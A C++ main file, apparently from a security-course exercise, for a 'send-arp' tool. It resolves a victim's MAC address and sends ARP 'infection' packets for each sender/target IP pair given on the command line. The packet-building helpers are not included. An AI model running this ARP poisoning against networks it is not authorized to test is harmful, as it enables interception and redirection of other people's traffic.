#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

//add netinfo.cpp and .h
#include "netinfo.h"
#include <string>
//arp
#include "arpmanager.h"


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> " //no -test yes send-arp
           "[<sender ip 2> <target ip 2> ...]\n"); //sendr and target ip get!
    printf("sample: send-arp eth0 172.30.1.17 172.30.1.254\n");
}





int main(int argc, char* argv[]) {
    if (argc < 4) { //argv[0~3] 4 cungboun
		usage();
		return EXIT_FAILURE;
	}
//BUT. dajungjjohap
    //if ip(sender and target) juso SSang
    if ((argc - 2) %2 != 0) {
        usage();
        return EXIT_FAILURE;
    }


	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //change
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

    //add
    Mac attackerMac;
    Ip attackerIp;

    if (!getAttackerInfo(dev, attackerMac, attackerIp)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }


    // sender . target johap read banbokmun
    //ai wal hardcoding out!
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]); //sender ip
        Ip targetIp(argv[i + 1]); //target ip

        Mac senderMac;

        if (!getSenderMac(
                pcap,
                attackerMac,
                attackerIp,
                senderIp,
                senderMac)) {
            fprintf(stderr, "failed to get sender MAC\n");
            continue;
        }
        if (!sendInfectPacket(
                pcap,
                attackerMac,
                senderMac,
                senderIp,
                targetIp)) {
            fprintf(stderr, "failed to infect sender\n");
            continue;
        }

        printf("infection packet sent\n");


        std::string senderMacString =
            static_cast<std::string>(senderMac);

        printf("sender MAC: %s\n", senderMacString.c_str());
    }

	pcap_close(pcap);
}
